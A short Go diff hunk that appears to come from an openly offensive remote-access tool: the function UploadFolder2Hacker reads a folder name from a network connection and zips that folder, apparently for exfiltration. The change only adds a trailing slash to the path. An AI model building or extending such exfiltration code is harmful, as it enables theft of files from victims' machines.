@@ -148,7 +148,7 @@ func UploadFolder2Hacker(connection net.Conn) (err error) {
 	folderName2download_raw, err := reader.ReadString('\n')
 
 	folderName2download := strings.TrimSuffix(folderName2download_raw, "\n")
-	ZipWriter(folderName2download, folderName2download+".zip")
+	ZipWriter(folderName2download+"/", folderName2download+".zip")
 
 	return
 }
